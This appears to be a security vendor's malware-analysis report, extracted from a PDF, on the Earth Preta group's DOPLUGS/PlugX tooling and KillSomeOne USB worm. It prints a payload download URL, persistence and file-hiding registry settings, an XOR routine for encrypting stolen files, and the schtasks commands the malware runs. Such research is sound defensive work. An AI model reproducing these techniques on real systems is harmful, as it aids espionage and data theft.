Introduction
In July 2023, Check Point disclosed a campaign called SMUGX, which focused on European countries and was
attributed to the advanced persistent threat (APT) group Earth Preta (also known as Mustang Panda and Bronze
President). In the same year, we obtained a phishing email targeting the Taiwanese government that contained a
piece of customized PlugX malware — the same one used in the SMUGX campaign. As most previous discussions
from other researchers focus on the European attacks, we would instead like to shed light on the Asian side of the
campaign. After months of investigation, we discovered more SMUGX campaign-related samples targeting not only
Taiwan, but also Vietnam, Malaysia, and other Asian countries in 2022 and 2023.
This kind of customized PlugX malware has been active since 2022, with related research being published by
Secureworks, Recorded Future, Check Point, and Lab52. During analysis, we observed that the piece of customized
PlugX malware is dissimilar to the general type of the PlugX malware that contains a completed backdoor command
module, and that the former is only used for downloading the latter. Due to its different functionality, we decided to
give this piece of customized PlugX malware a new name: DOPLUGS.
Upon investigation, we found that the DOPLUGS malware uses the KillSomeOne module, a USB worm that was first
disclosed by a Sophos report in November 2020. However, an entry from January 2020 mentioned a USB worm; this
entry was also the first report that analyzed a piece of PlugX malware integrated with KillSomeOne behavior.
In this blog entry, we focus on the Earth Preta campaign, providing an analysis of the DOPLUGS malware variant that
the group used, including backdoor command behavior, integration with the KillSomeOne module, and its evolution.
Decoys and victims
Based on noteworthy DOPLUGS files we’ve found since July 2023 (Table 1), we can determine that the victims, at
least for the attacks that employed these specific samples, are from Taiwan and Mongolia. Based on the file names, it
seems the files used for social engineering were related to current events, such as the Taiwanese presidential
election that occurred in January 2024.

Looking at VirusTotal data (targeting Asia) from 2022 to 2023, we observed that perpetrators of the campaign
primarily targeted Taiwan and Vietnam, with lower counts from other Asian countries like China, Singapore, Hon
Kong, Japan, India, Malaysia, and Mongolia.

Spear-phishing emails as Initial Access
The spear-phishing emails sent to victims are embedded with a Google Drive link that hosts a password-protected
archive file, which will download DOPLUGS malware. Figure 4 shows a sample email.

The malicious Windows shortcut files (LNK) seen in Table 1 are as disguised as documents and archived in an RAR
file. The target command in the LNK file is as follows:

When the victim selects the LNK file, a MSI file will be downloaded from https://getfiledown[.]com/vgbskgyu, after
which it will drop the following files for further execution:

Analysis of the tools used in the campaign
In this section we will go through the detailed analysis of DOPLUGS, DOPLUGS with the KillSomeOne module, and
the general type of the PlugX malware. Before introducing the malware, we would like to summarize all the published
reports related to the analysis in this section, using the timeline here for reference:
Figure 6. Timeline of the malware evolution.

The timeline indicates the publishing time, the title and source of the report, and the related malware family.
The DOPLUGS downloader
DOPLUGS is a downloader with four backdoor commands, one of the commands is designed to download the
general type of the PlugX malware. The details of the payload decryption and execution flow were previously
discussed by Lab52 in December 2023. Our own analysis will instead focus on backdoor behavior.

Backdoor behavior
Since 2018, Earth Preta has constantly updated the backdoor command sets in the PlugX malware, which has at
least four generations according to our observations:
1. PlugX (No given name for this version)
2. REDDELTA
3. Hodur
4. DOPLUGS
In summary, the backdoor command for the first three versions can be divided into two groups. The first group
(0x1001) contains the functions customized by the threat actor, while the second group (0x1002) is copied from the
general type of the PlugX malware. However, in DOPLUGS (the latest version), the backdoor command set only has
four commands, with the functions shown in Figure 8.

Whether sending or receiving data to and from the C&C server, it will be encrypted or decrypted with the RC4
algorithm, which is 0x20 bytes retrieved from the C&C server (however, it is not fixed).
We also observed another variant (dca39474220575004159ecff70054bcf6239803fcf8d30f4e2e3907b5b97129c) that
has different backdoor command values, but with the same functionality (shown in Table 4).

Table 4. Another version of the DOPLUGS backdoor commands
Interestingly, this DOPLUGS version abuses legitimate Adobe application to lure victims (with most of the samples
VirusTotal sourced from Vietnam). According to the evolution of the backdoor command, we suspect that the original
purpose of the 0x1002 group in the previous version is for file delivery only. This also explains why the 0x1002 group
has been removed from this version, since the downloader behavior for the next-stage payload is replaced by the
0x3004 backdoor command.
The general type of the PlugX malware
In this section, we will introduce the general type of the PlugX malware that is downloaded via the backdoor
command 0x3004 in DOPLUGS. Fortunately, we were able to download two types of final payloads from the C&C
server for our analysis. Table 5 shows the downloaded files.

According to a report published by Palo Alto, these samples of the general PlugX malware might be modified from the
THOR PlugX based on the following observations:
1. Both have a similar code structure in DLL loaders.
2. Both have the same shellcode before entering the PlugX main function.
3. Both have the same argument in the command-line execution.

1. The adobe_licensing_wf_helper.exe file is for installation and setting persistence.
2. The adobe_licensing_wf_helper.exe 600 0 file injects itself into %SystemRoot%\system32\WerFault.exe with
arguments 601 0.
3. The "%SystemRoot%\system32\WerFault.exe 601 0 file executes the backdoor command.

Another part is the configuration decryption. In the type 1 PlugX malware, the configuration section is shown in plain
text after decryption, but for type 2, it’s still encrypted. The configuration data will need to be decrypted again with the

Integration with KillSomeOne
While hunting for more DOPLUGS related samples, we came across a DOPLUGS variant with KillSomeOne
functionality. The KillSomeOne module is a plug-in specializing in malware distribution, information collection, and
document theft via USB. It expands the ability for infection so that initial access methods are not limited to phishing or
decoy documents.
The KillSomeOne module was first introduced in a November 2020 Sophos report. The DOPLUGS variant with the
KillSomeOne module has high similarities with the previous DOPLUGS variant we analyzed, with one of the major
differences being the infection method. It has four components: a legitimate executable, a malicious DLL, an
encrypted payload, and an encrypted PE file. This variant has an extra launcher file that executes the legitimate
executable to perform DLL-sideloading behaviors.

The loader
The loader InstanceFinderDlgUI.dll, compiled by Golang, is the only one we found. Figure 20 shows its functions.
Figure 17. Golang functions of the file “InstanceFinderDlgUI.dll”

Its execution flow is as follows:
It reads the encrypted payload, InstanceFinderDlg.dat in the same folder.
It decrypts the encrypted payload by XOR with the single key, 0x73.
It enters the decrypted payload by main_NTCreateThreadEx.
The payload behavior
The payload process is similar to the regular DOPLUGS variant. The function checks the argument of the command
line HPSmart.exe “argument”. There is no argument in the first execution: It only sets up persistence and relaunches
itself with the argument, which is  the three-digit random number. We list the command-line arguments and their
corresponding behavior in the following table:

Setting up Persistence
Persistence is set up via the following steps:
1. The function copies all the files to the installation directory, C:\Users\Public\HPSmartMZWx\.
2. It sets up the value C:\Users\Public\HPSmartMZWx\HPSmart.exe xxx in the registry
Software\Microsoft\Windows\CurrentVersion\Run key for persistence.
3.  It creates Process C:\Users\Public\HPSmartMZWx\HPSmart.exe xxx.
KillSomeOne Thread
The KillSomeOne thread has two major behaviors, the first of which removes all traces related to previous pieces of
PlugX malware, including files, process, registry, and scheduled tasks.

Table 12. Removing traces of the previous piece of PlugX malware
The second behavior is related to USB infection. It applies the API DeviceIoControl  with the parameter 0x2d1400 to
identify the USB drive. It then creates three threads in the targeted USB drive, which we detail in the following
sections.
Thread 1: Worm behavior in USB drive (Lateral Movement)
This thread creates the mutex USB_NOTIFY3_INF_{USB_volume} for mark. Before the worm behavior, these
registries are enabled to hide the file extension and the folders that contain malware and stolen documents.
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced, Hidden=0
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced, ShowSuperHidden=0
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced, HideFileExt=1
In infected USB drives, the four components are copied into the hidden folder.
HPReport.exe to {USB_volume}:\Usb Drive\1.0\5.dat
HPSmart.exe to {USB_volume}:\Usb Drive\1.0\6.dat
InstanceFinderDlgUI.dll to {USB_volume}:\Usb Drive\1.0\2.dat
InstanceFinderDlg.dat to {USB_volume}:\Usb Drive\1.0\InstanceFinderDlg.dat

download
The decrypted launcher, HPReport.exe, is copied to {USB_volume}:\Usb Disk ({free space of USB}).exe, (which is
disguised as a USB drive) and duplicated with the name opn-U({free space of USB}).cmd.to the following folders:
{USB_volume}:\AVAST\Protection for Autorun\
{USB_volume}:\SMADAV\SMADAV\
{USB_volume}:\Removable Disk\
The KillSomeOne module specializes in USB infections. The launcher pretends to be a fake USB disk to lure victims
into selecting it — a convincing guise unless users check the extension. The purpose of the launcher is simple: It
renames 2.dat to InstanceFinderDlgUI.dll and executes 6.dat, which is the executable file that will sideload the
InstanceFinderDlgUI.dll file via DLL sideloading.

{USB_volume}:\AVAST\Protection for Autorun\ (Including files in subfolder)
{USB_volume}:\SMADAV\SMADAV\ (Including files in subfolder)
Thread 2: Information or file stealer (Collection)
This thread creates the mutex, USB_NOTIFY3_COP_{USB_volume}, for mark. There are two kinds of stealing
conditions, each of which we discuss here:
First condition: Steals the document files
If the connection succeeds in connecting to https://www.microsoft.com/, it will check the file extensions in these
predefined folders:
{USB_volume}:\Kaspersky\Usb Drive\1.0\
{USB_volume}:\Usb Drive\1.0\
{USB_volume}:\.System\Device\USB\3.0\Kaspersky\Usb Drive\1.0
{USB_volume}:\.System\Device\USB\3.0\Usb Drive\1.0\
If the file extensions are not .cmd, .bat, or .dll and the file name is not RECYCLERS.BIN, it will transfer the file to
%userprofile%\AppData\Roaming\Render\1.0\  and empty the content of the original file.
We also found another functionality, but it seems that it has not been implemented as of this writing. This functionality
collects all files under the same folders and looks for the files with the following extensions:
.doc
.docx
.ppt
.pptx
 .xls
.xlsx
.pdf
Afterward, it will encode the file name with base64, encrypt the file content, and copy the file to the folder of the
current process.
Here is the XOR algorithm to encrypt the stolen files:
encrypted_contents = []
encrypted_key = 0x6D
18/20
for i in range(len(contents)):
    encrypted_contents.append(contents[i] ^ encrypted_key)
    encrypted_key += 0xAA
Second condition: Steals victim information
If the connection fails, the thread checks the value in registry
(HKCU|HKLM)\System\CurrentControlSet\Control\Network\Version,which does not exist. Afterward, it creates and
executes the batch script %temp%\edg{value of QueryPerformanceCounter}.bat to collect the information of the
victim.

The output data will then be encrypted and dropped to {USB_volume}:\Usb Drive\1.0\ {value of
SOFTWARE\CLASSES\ms-pu\CLSID}.dat.
Thread 3: Execute encrypted batch script
This thread creates the mutex, USB_NOTIFY_BAT_H3_{USB_volume}for mark, which will be executed only under
these conditions:
When connection with https://www.microsoft.com fails
When there is no value in System\\CurrentControlSet\\Control\\Network\\version (this registry is enabled when
argument of cmd line = “-net”)
The thread will search all batch scripts inside the following folders:
{USB_volume}:\Usb Drive\1.0\p\
{USB_volume}:\Kaspersky\Usb Drive\1.0\p\
{USB_volume}:\.System\Device\USB\3.0\Usb Drive\1.0\p\
If the batch script name does not contain the strings tmpc_ or tmp_, the script will be decrypted via XOR algorithm,
which is the same as the file encryption in the thread 2 subsection. The new batch will then be created in %temp%\
{value of QueryPerformanceCounter}.bat and executed by ShellExecuteW with the following contents:
{USB_volume}

cd "{USB_volume}:\target folder\"

{decrypted contents in batch file}

DOPLUGS backdoor behavior (Command and Control)
This behavior is the same as the original piece of DOPLUGS malware and is responsible for C&C communication,
backdoor commands, and downloading the next-stage general type of the PlugX malware.
Enabling Wi-Fi connection
The following command line is executed to set up scheduled tasks to enable Wi-Fi connection:
cmd.exe /c schtasks.exe /create /sc minute /mo 30 /tn "Security WIFI Script" /tr "netsh interface set interface
"""Wireless Network Connection""" enabled" /ru SYSTEM /F&schtasks.exe /run /tn "Security WIFI Script" 
cmd.exe /c schtasks.exe /create /sc minute /mo 30 /tn "Security WIFI2 Script" /tr "netsh interface set interface
"""Wireless Network Connection 2""" enabled" /ru SYSTEM /F&schtasks.exe /run /tn "Security WIFI2 Script" 
19/20
cmd.exe /c schtasks.exe /create /sc minute /mo 30 /tn "Security WIFI3 Script" /tr "netsh interface set interface
"""Wireless Network Connection 3""" enabled" /ru SYSTEM /F&schtasks.exe /run /tn "Security WIFI3 Script"
Old variant
In addition to DOPLUGS, we hunted down several customized PlugX malware samples that are also equipped with
the KillSomeOne module. Based on our investigation, this integration would have been active for three years, with the
report published by Avira being the first to reveal this technique. The sample mentioned in Avira’s report is the first
PlugX variant with the KillSomeOne module designed for spreading via USB.

Table 13. Different stages of evolution for KillSomeOne + PlugX
Upon checking backdoor commands of these PlugX malware types, we found an additional variant that serves as the
transition from DOPLUGS to Hodur. This version keeps the disk module of the general type of the PlugX malware,
although here the customized backdoor command is modified to the improved DOPLUGS type (unlike the original
DOPLUGS variant without any module from the general type of the PlugX malware). Another impressive feature is
that the KillSomeOne + Hodur variant has two categories of C&C servers for communication: the first one as a
regular C&C server to receive backdoor commands, while the second one is designed to download payloads for
process injection in svchost.exe.
Conclusion
Earth Preta has primarily focused on targeting government entities worldwide, particularly within the Asia-Pacific
region and Europe. Based on our observations, we believe Earth Preta tends to use spear-phishing emails and
Google Drive links in its attacks.
We explained the purpose of the DOPLUGS malware (which we believe has been in use since 2022), one of the
primary tools Earth Preta uses to download the general type of the PlugX malware. While hunting for other samples,
we discovered a DOPLUGS variant that has KillSomeOne module integration and that can be traced back to 2018.
This shows that Earth Preta has been refining its tools for some time now, constantly adding new functionalities and
features.  
Over the course of our investigations into Earth Preta’s activities, we have observed that the group remains highly
active, particularly in Europe and Asia. It is likely that we will hear more from this group in the future, so it is a good
idea for security teams to familiarize themselves with how Earth Preta operates.
